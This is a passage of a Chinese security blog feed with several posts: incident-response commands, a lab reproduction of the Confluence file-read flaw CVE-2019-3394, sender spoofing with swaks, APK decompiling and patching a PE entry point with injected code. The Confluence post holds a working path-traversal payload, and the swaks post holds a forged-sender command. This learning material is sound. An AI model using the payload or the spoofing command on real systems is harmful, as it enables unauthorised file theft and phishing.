class="line">ps aux | grep pid | grep -v grep</span><br></pre></td></tr></table></div></figure></p><p>日志分析命令：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看系统中所有用户最近一次登陆信息</span><br><span class="line">lastlog</span><br><span class="line"></span><br><span class="line">#显示用户错误的登陆列表</span><br><span class="line">lastb</span><br><span class="line"></span><br><span class="line">#显示用户最近登陆信息（数据源为/var/log/wtmp、/var/log/btmp）</span><br><span class="line">last</span><br></pre></td></tr></table></div></figure></p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>【开始】-&gt;【运行】<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msconfig//查看开机启动项</span><br><span class="line">%UserProfile%\Recent//Recent最近打开的文件夹</span><br><span class="line">compmgmt.msc//计算机管理</span><br><span class="line">eventvwr//事件管理器</span><br></pre></td></tr></table></div></figure></p><p>CMD命令：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#查看当前网络连接</span><br><span class="line">netstat -aon</span><br><span class="line">netstat -aon | findstr ESTABLISHED</span><br><span class="line"></span><br><span class="line">#根据netstat定位pid，根据pid定位进程</span><br><span class="line">tasklist | findstr 1228</span><br><span class="line"></span><br><span class="line">#根据wmic process获取进程的全部路径</span><br><span class="line">wmic process | findstr &quot;xxxx.exe&quot;</span><br><span class="line"></span><br><span class="line">#查看用户信息</span><br><span class="line">net user username</span><br><span class="line"></span><br><span class="line">#查看当前系统用户对话</span><br><span class="line">query user</span><br><span class="line"></span><br><span class="line">#踢出用户</span><br><span class="line">logoff</span><br><span class="line"></span><br><span class="line">#查看系统版本及补丁信息</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></div></figure></p><p>系统信息排查：<br>1、查看环境变量<br>2、查看Windows计划<br>3、查看账号信息，如隐藏用户等；</p><p>排查工具：<br>1、PC Hunter<br>2、ProcessExplorer<br>3、Microsoft Network Monitor</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在开始学习应急响应的相关知识，接触到了很多，比方说白加黑啊、几个APT组织啊，流量分析、天眼分析等等，其实还没有实际接触过应急响应，这里就先做个最基础的笔记，等会让我想想整体的框架是啥。&lt;/p&gt;
&lt;p&gt;好了知道怎么写了，大概就这么写吧，这里不详细记录应急的过程，记录下一
      
    
    </summary>
    
    
    
      <category term="应急响应" scheme="http://sherlocz.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Confluence文件读取漏洞复现(CVE-2019-3394)</title>
    <link href="http://sherlocz.github.io/2020/03/24/Confluence%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-3394/"/>
    <id>http://sherlocz.github.io/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/</id>
    <published>2020-03-24T02:30:01.000Z</published>
    <updated>2020-03-24T04:08:00.344Z</updated>
    
    <content type="html"><![CDATA[<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>6.1.0 &lt;= version &lt; 6.6.16<br>6.7.0 &lt;= version &lt; 6.13.7<br>6.14.0 &lt;= version &lt; 6.15.8</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用P师傅的vulhub直接上<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-compose</span><br><span class="line"># Download the latest version of the vulhub </span><br><span class="line">git clone https://github.com/vulhub/vulhub.git  </span><br><span class="line"># Entry vulnerability directory </span><br><span class="line">cd /confluence/CVE-2019-3396/</span><br><span class="line"># Compile (optional) </span><br><span class="line">docker-compose build </span><br><span class="line"># Run </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></div></figure></p><p>安装完成之后本地会开启8090端口，我们根据导向进行安装<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/1.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/2.png" alt><br>这里我们需要去官网获取一个licence，注意这里的Server ID，成功获取之后在Setup页面点击下一步，等他转圈圈就行了<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/3.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/4.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/5.png" alt><br>然后稀里糊涂就安装成功了。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>创建页面的时候抓包<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /rest/api/content/65603?status=draft HTTP/1.1</span><br><span class="line">Host: 192.168.75.138:8090</span><br><span class="line">Content-Length: 373</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.75.138:8090</span><br><span class="line">Referer: http://192.168.75.138:8090/pages/resumedraft.action?draftId=65603&amp;draftShareId=e3bf8f62-5cdc-4586-ae67-0098ed31f5a5</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=EB2B904418498E2A22446B8A4D44664A</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;current&quot;,&quot;title&quot;:&quot;123123&quot;,&quot;space&quot;:&#123;&quot;key&quot;:&quot;SHER&quot;&#125;,&quot;body&quot;:&#123;&quot;editor&quot;:&#123;&quot;value&quot;:&lt;p&gt;1231231&lt;/p&gt;</span><br><span class="line">&quot;,&quot;representation&quot;:&quot;editor&quot;,&quot;content&quot;:&#123;&quot;id&quot;:&quot;65603&quot;&#125;&#125;&#125;,&quot;id&quot;:&quot;65603&quot;,&quot;type&quot;:&quot;page&quot;,&quot;version&quot;:&#123;&quot;number&quot;:1,&quot;minorEdit&quot;:true,&quot;syncRev&quot;:&quot;0.2ROrHE4DizkcCc1u6UtkBrc.10&quot;&#125;,&quot;ancestors&quot;:[&#123;&quot;id&quot;:&quot;65584&quot;,&quot;type&quot;:&quot;page&quot;&#125;]&#125;</span><br></pre></td></tr></table></div></figure></p><p>将其中的value值修改成：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;img class=\&quot;confluence-embedded-image\&quot; src=\&quot;/packages/../web.xml\&quot; /&gt;&lt;/p&gt;</span><br></pre></td></tr></table></div></figure></p><p>然后再导出word的时候抓包</p><p><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/6.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/7.png" alt></p><p>RCE<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/8.png" alt></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/jas502n/CVE-2019-3394" title="https://github.com/jas502n/CVE-2019-3394" target="_blank" rel="noopener">CVE-2019-3394</a><br><a href="https://github.com/Yt1g3r/CVE-2019-3396_EXP" title="https://github.com/Yt1g3r/CVE-2019-3396_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2019-3396_EXP</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot; class=&quot;headerlink&quot; title=&quot;影响范围&quot;&gt;&lt;/a&gt;影响范围&lt;/h1&gt;&lt;p&gt;6.1.0 &amp;lt;= version &amp;lt; 6.6.16&lt;br&gt;6.7.0 &amp;lt;= version &amp;lt; 6.
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>利用spf伪造邮箱发送</title>
    <link href="http://sherlocz.github.io/2020/03/23/%E5%88%A9%E7%94%A8spf%E4%BC%AA%E9%80%A0%E9%82%AE%E7%AE%B1%E5%8F%91%E9%80%81/"/>
    <id>http://sherlocz.github.io/2020/03/23/利用spf伪造邮箱发送/</id>
    <published>2020-03-23T04:40:56.000Z</published>
    <updated>2020-03-23T04:49:58.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h1><p>看网易官方对SPF的定义：<br><img src="/2020/03/23/利用spf伪造邮箱发送/163.png" alt></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先用nslookup命令查看是否存在SPF记录<br><img src="/2020/03/23/利用spf伪造邮箱发送/spf.png" alt></p><p>这里并没有设置SPF，没有SPF字样出现</p><p>Kali启动，输入命令：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swaks --to xxx@163.com --from test_nospf@xxx.cn  --body &apos;This is a test mailing&apos; --header &apos;Subject: test&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">常用Swaks指令</span><br><span class="line">--ehlo     [helo-string]：伪造ehlo头信息</span><br><span class="line">--header     [header-and-data]：伪造From、Subject、Message-Id、X-Mailer等头信息</span><br><span class="line">--data     [data-portion]：伪造DATA的全部内容，可直接将邮件源码作为选项</span><br><span class="line">--attach     [attachment-specification]：添加附件</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/03/23/利用spf伪造邮箱发送/success.png" alt></p><p>发送成功，看邮箱收到没有</p><p><img src="/2020/03/23/利用spf伪造邮箱发送/mail.png" alt></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[你熟悉得那些诱人的邮件都是如何伪造得？ “<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&amp;mid=2247483932&amp;idx=1&amp;sn=2fdbd77c441354a3b6a4a4b39c4a234f&amp;chksm=9b370a28ac40833ef7f5773e09ea0d38155e5b673e1a63209e81a5ff4fc9e0d1ecc967a1408c&amp;mpshare=1&amp;scene=1&amp;srcid=0323QOmo5lj78Oc1T5xsiQYc&amp;sharer_sharetime=1584933653495&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=d3059eb8c008ccac8f45b250923aca43ac9c6c49c8267ffb82d154dcea815a41811dbfb26a5eff335dc717d552f2e0d0e9542bb27c9a11e2b2d00b6aebb8f29e79f3ca5b1b42b32a7b48ff156970177c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080085&amp;lang=zh_CN&amp;exportkey=A947Qcj62k29xmJtfgTCZuk%3D&amp;pass_ticket=hFiImDgckOZoXTtlh24T0c93VTdcIgyprkEcstqbILTiVo%2BeNPKDXHJgWazcpizo&quot;" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&amp;mid=2247483932&amp;idx=1&amp;sn=2fdbd77c441354a3b6a4a4b39c4a234f&amp;chksm=9b370a28ac40833ef7f5773e09ea0d38155e5b673e1a63209e81a5ff4fc9e0d1ecc967a1408c&amp;mpshare=1&amp;scene=1&amp;srcid=0323QOmo5lj78Oc1T5xsiQYc&amp;sharer_sharetime=1584933653495&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=d3059eb8c008ccac8f45b250923aca43ac9c6c49c8267ffb82d154dcea815a41811dbfb26a5eff335dc717d552f2e0d0e9542bb27c9a11e2b2d00b6aebb8f29e79f3ca5b1b42b32a7b48ff156970177c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080085&amp;lang=zh_CN&amp;exportkey=A947Qcj62k29xmJtfgTCZuk%3D&amp;pass_ticket=hFiImDgckOZoXTtlh24T0c93VTdcIgyprkEcstqbILTiVo%2BeNPKDXHJgWazcpizo&quot;</a>)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SPF&quot;&gt;&lt;a href=&quot;#SPF&quot; class=&quot;headerlink&quot; title=&quot;SPF&quot;&gt;&lt;/a&gt;SPF&lt;/h1&gt;&lt;p&gt;看网易官方对SPF的定义：&lt;br&gt;&lt;img src=&quot;/2020/03/23/利用spf伪造邮箱发送/163.png&quot; alt&gt;&lt;/
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>App反汇编步骤</title>
    <link href="http://sherlocz.github.io/2020/03/23/App%E5%8F%8D%E6%B1%87%E7%BC%96%E6%AD%A5%E9%AA%A4/"/>
    <id>http://sherlocz.github.io/2020/03/23/App反汇编步骤/</id>
    <published>2020-03-23T02:16:15.000Z</published>
    <updated>2020-03-23T02:41:00.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul><li>apktool.jar apktool.bat</li><li><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">https://ibotpeaches.github.io/Apktool/install/</a></p></li><li><p>dex2jar</p></li><li><p>下载地址：<a href="https://sourceforge.net/projects/dex2jar/" target="_blank" rel="noopener">https://sourceforge.net/projects/dex2jar/</a></p></li><li><p>jd-gui.jar</p></li><li><p>下载地址：<a href="http://jd.benow.ca/" target="_blank" rel="noopener">http://jd.benow.ca/</a></p></li><li><p>完整工具包网盘下载地址</p></li><li><a href="https://pan.baidu.com/s/1u9ZAIlnMMHJx9LWRO7OWcA" target="_blank" rel="noopener">https://pan.baidu.com/s/1u9ZAIlnMMHJx9LWRO7OWcA</a></li></ul><h1 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h1><p>首先将下载好的 apktool.jar和apktool.bat复制到C:/Windows下，因为path当中本身就设置了C:/Windows这个路径在环境变量中，当然你也可以自定义路径。</p><p>进入我们测试apk的目录，在命令行下输入：<strong>apktool d abc.apk</strong><br><img src="/2020/03/23/App反汇编步骤/1.png" alt></p><p>这一步之后我们就可以看到apk中的一些源文件了<br><img src="/2020/03/23/App反汇编步骤/2.png" alt></p><p>然后我们将abc文件夹的文件重新打包成apk，进入abc文件夹，输入命令 <strong>apktool b abc</strong>，默认输出abc,apk文件为当前目录</p><p>然后你会看见abc文件夹下新出了一个dist文件夹，里面就存有我们重新打包好之后的apk<br><img src="/2020/03/23/App反汇编步骤/apk.png" alt></p><p>将apk修改成zip文件，然后解压出其中的<strong>classes.dex</strong>文件，将这个文件复制到<strong>dex2jar</strong>文件夹下面，在命令行下运行 <strong>d2j-dex2jar.bat classes.dex</strong><br><img src="/2020/03/23/App反汇编步骤/d2j.png" alt><br>此时看见目录中多出了一个classes-dex2jar.jar的文件<br><img src="/2020/03/23/App反汇编步骤/jar.png" alt></p><p>最后用jd-gui文件打开这个classes-dex2jar.jar文件，我们就能看见源码了<br><img src="/2020/03/23/App反汇编步骤/code.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工具&quot;&gt;&lt;a href=&quot;#工具&quot; class=&quot;headerlink&quot; title=&quot;工具&quot;&gt;&lt;/a&gt;工具&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;apktool.jar apktool.bat&lt;/li&gt;
&lt;li&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://ibotpe
      
    
    </summary>
    
    
    
      <category term="反汇编" scheme="http://sherlocz.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习--将messagebox添加到空白区</title>
    <link href="http://sherlocz.github.io/2020/03/21/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E5%B0%86messagebox%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%A9%BA%E7%99%BD%E5%8C%BA/"/>
    <id>http://sherlocz.github.io/2020/03/21/逆向学习-将messagebox添加到空白区/</id>
    <published>2020-03-21T08:23:56.000Z</published>
    <updated>2020-03-27T03:04:09.695Z</updated>
    
    <content type="html"><![CDATA[<p>好久没写blog了，但是一直有在学逆向，就是不晓得写什么，感觉很多都是很基础的东西，写的价值不大。</p><p>这里看着教程做了个小小的程序改动，这里自己也来尝试一下吧。</p><ul><li>前置知识：逆向、PE结构、进制</li><li>实现目的：修改OEP(即程序的入口点)，使得程序开始的时候先弹出一个MessageBox然后再运行</li></ul><h1 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h1><p>这个函数简单来说就是弹个小框框,里面的参数我们先不管</p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(0, 0, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>VS下进行编译，呼啦啦~<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/MessageBox.png" alt></p><h1 id="E8-E9公式"><a href="#E8-E9公式" class="headerlink" title="E8/E9公式"></a>E8/E9公式</h1><p>知道了作用之后，我们在MessageBox函数这里设置断点，来看反汇编代码<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/E8.png" alt><br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/E9.png" alt></p><p>我这里把汇编代码整理一下更加清楚一点：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 地址 #  #   硬编码   #    #                函数                #   #   跳转地址  #</span><br><span class="line">00F71723 E8 E0 FA FF FF    call    @__CheckForDebuggerJustMyCode@4    (0F71208h)</span><br><span class="line">00F71208 E9 63 05 00 00    jmp     __CheckForDebuggerJustMyCode       (0F71770h)</span><br></pre></td></tr></table></div></figure></p><p>我们可以看出 call命令对应的硬编码为E8，jmp对应的硬编码为E9。那么硬编码后面的四位，和我们跳转的地址是 如何和进行转换的呢。</p><p>上公式：<br><strong>真正要跳转的地址 = E8这条命令的下一行地址 + E8后面的四位</strong></p><p>我们看上面的图可以带入公式里面验证一下</p><p>00F71208 = 00F71728 + FFFFFAE0<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/calc.png" alt></p><p>我们使用计算器计算，发现结论正确。</p><p>又∵ <strong>E8这条命令的下一行地址 = E8的地址 + 硬编码的长度</strong></p><p>所以这条命令就可以变成：</p><p><strong>真正要跳转的地址 = E8的地址 + 硬编码的长度 + E8后面的四位</strong></p><h1 id="写入OEP的代码"><a href="#写入OEP的代码" class="headerlink" title="写入OEP的代码"></a>写入OEP的代码</h1><p>因为我们的程序最终是要用记事本的方式打开修改其中的十六进制数，所以我们不能直接写汇编代码进去的<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/6a.png" alt><br>从反汇编后的汇编代码我们可以看出，首先我们的代码做了4个push，也就是MessageBox这个函数传入的四个参数，我们这里由于全部都是0，所以我们对应push的值也是0<br>最终我们将会加入在OEP后面的十六进制为：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6A 00 6A 00 6A 00 6A 00 E8 .. .. .. .. E9 .. .. .. ..</span><br></pre></td></tr></table></div></figure></p><h1 id="找到文件中的MessageBox地址"><a href="#找到文件中的MessageBox地址" class="headerlink" title="找到文件中的MessageBox地址"></a>找到文件中的MessageBox地址</h1><p>我们的逻辑是这样的，开始运行之后首先跳转到MessageBox，然后jmp到开始的位置重新开始</p><p>这里我拿任意一个软件做例子，用OD打开，然后再右下角输入 <strong>bp MessageBoxA</strong>，点击菜单栏中的那个 <strong>B</strong> 按钮，我们就能发现MessageBox在这个程序中跳转的地址。</p><p>此处的程序为 75D90F40<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/bp.png" alt></p><h1 id="找到我们写入代码的空白区"><a href="#找到我们写入代码的空白区" class="headerlink" title="找到我们写入代码的空白区"></a>找到我们写入代码的空白区</h1><p>我这里打开的程序，这里用PETOOLS观察第一个节的相关数据<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/PE.png" alt><br>这个时候我们要写入的数据空白处开始的位置就是 十六进制的 002558D7 + 400</p><p>所以在这个计算后的位置我们开始写入上面的代码，如图，这里还有E8/E9后面的数没有写<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/6AA.png" alt></p><h1 id="通过公式计算出最终写入的代码"><a href="#通过公式计算出最终写入的代码" class="headerlink" title="通过公式计算出最终写入的代码"></a>通过公式计算出最终写入的代码</h1><p>E8:255ce8<br>E9:255ced<br>E8下一行地址：<br>E9下一行地址：<br>MessageBox:75B50F40<br>ImageBase:00400000<br>OEP:002085D8</p><p>E8下一行地址相对PointerToRawData偏移量：0x255ce8+5-0x400=0x2558E8+5<br>映射到内存中，E8下一行地址：ImageBase+VirtualAddress + 0x2558E8+5= 6568E8<br>E8后面的值：MessageBox - 0x6568E8-5 = 0x754FA658 0x754FA653</p><p>计算E9后面的值：<br>原来OEP:ImageBase + AddressOfEntryPoint = 6085D8</p><p>文件中，E9下一行地址相对PointerToRawData偏移量：0x255ced-0x400=0x2558ed +5</p><p>映射到内存中，E9下一行地址：ImageBase + VirtualAddress + 0x2558ed =6568ed</p><p>E9后面的值：MessageBox - 6568ed = 754FA653 754FA64E</p><p>修改OEP:<br>文件中shellcode起始地址相对PointerToRawData偏移量：255ce0 - 400 = 2558E0<br>映射到内存中相对ImageBase偏移：VitualAddress + 2558E0 = 2568e0</p><p>编写就完事了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好久没写blog了，但是一直有在学逆向，就是不晓得写什么，感觉很多都是很基础的东西，写的价值不大。&lt;/p&gt;
&lt;p&gt;这里看着教程做了个小小的程序改动，这里自己也来尝试一下吧。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前置知识：逆向、PE结构、进制&lt;/li&gt;
&lt;li&gt;实现目的：修改OEP(即
      
    
    </summary>
    
    
    
      <category term="逆向" scheme="http://sherlocz.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>C语言逆向基础</title>
    <link href="http://sherlocz.github.io/2020/03/03/C%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
    <id>http://sherlocz.github.io/2020/03/03/C语言逆向基础/</id>
    <published>2020-03-03T12:45:58.000Z</published>
    <updated>2020-03-04T13:09:07.850Z</updated>
    
    <content type="html"><![CDATA[<p>C语言反汇编后的代码学习</p><p>C语言的基本数据类型：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">char1byte</span><br><span class="line">short2byte</span><br><span class="line">int4byte</span><br><span class="line">long4byte</span><br><span class="line">float4byte</span><br><span class="line">double8byte</span><br></pre></td></tr></table></div></figure></p><p>汇编堆栈图：<br><img src="/2020/03/03/C语言逆向基础/dzt.png" alt></p><p>从图中我们可以看出<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[EBP-4n]局部变量</span><br><span class="line">[EBP+4]返回值</span><br><span class="line">[EBP+8]参数</span><br><span class="line">......</span><br></pre></td></tr></table></div></figure></p><h1 id="利用vs进行反汇编"><a href="#利用vs进行反汇编" class="headerlink" title="利用vs进行反汇编"></a>利用vs进行反汇编</h1><p>首先编写好C语言代码，然后设置断点，F5编译，最后调试-&gt;窗口-&gt;反汇编(寄存器)查看我们想要的东西</p><h1 id="返回值反汇编分析"><a href="#返回值反汇编分析" class="headerlink" title="返回值反汇编分析"></a>返回值反汇编分析</h1><h2 id="char类型的返回值"><a href="#char类型的返回值" class="headerlink" title="char类型的返回值"></a>char类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/char.png" alt><br>反汇编之后我们发现，返回值保存在了al寄存器中<br><img src="/2020/03/03/C语言逆向基础/al.png" alt></p><h2 id="short类型的返回值"><a href="#short类型的返回值" class="headerlink" title="short类型的返回值"></a>short类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/short.png" alt><br>反汇编之后我们发现，返回值保存在了ax寄存器中<br><img src="/2020/03/03/C语言逆向基础/ax.png" alt></p><h2 id="int类型的返回值"><a href="#int类型的返回值" class="headerlink" title="int类型的返回值"></a>int类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/int.png" alt><br>反汇编之后我们发现，返回值保存在了ax寄存器中<br><img src="/2020/03/03/C语言逆向基础/eax.png" alt></p><h1 id="数组反汇编分析"><a href="#数组反汇编分析" class="headerlink" title="数组反汇编分析"></a>数组反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/array_1.png" alt><br><img src="/2020/03/03/C语言逆向基础/array.png" alt><br>特点：等宽连续</p><h1 id="结构体反汇编分析"><a href="#结构体反汇编分析" class="headerlink" title="结构体反汇编分析"></a>结构体反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/jgt.png" alt><br><img src="/2020/03/03/C语言逆向基础/jgtt.png" alt><br>特点：不一定等宽但一定连续</p><h1 id="if语句反汇编分析"><a href="#if语句反汇编分析" class="headerlink" title="if语句反汇编分析"></a>if语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/if.png" alt><br><img src="/2020/03/03/C语言逆向基础/iff.png" alt><br>其实if的反汇编就是jcc判断跳转到哪里的内存地址</p><h1 id="do-while语句反汇编分析"><a href="#do-while语句反汇编分析" class="headerlink" title="do..while语句反汇编分析"></a>do..while语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/do_while.png" alt><br><img src="/2020/03/03/C语言逆向基础/do_whilee.png" alt></p><h1 id="for语句反汇编分析"><a href="#for语句反汇编分析" class="headerlink" title="for语句反汇编分析"></a>for语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/forr.png" alt><br>这里可以调试看的更加的清楚，首先跳转到for循环内部，然后将x的值传给eax再传给[ebp-8]也就是参数，第一次会直接跳到和y相比较，比较大小如果比y小则会跳转到printf那里，然后会[add esp,8] 这里的意思是删除栈顶的两个参数x,y，然后跳入到for循环内部，这个时候第二次进入x+1，也就是i++，后面一直循环这个操作，直到x&gt;y为止。</p><h1 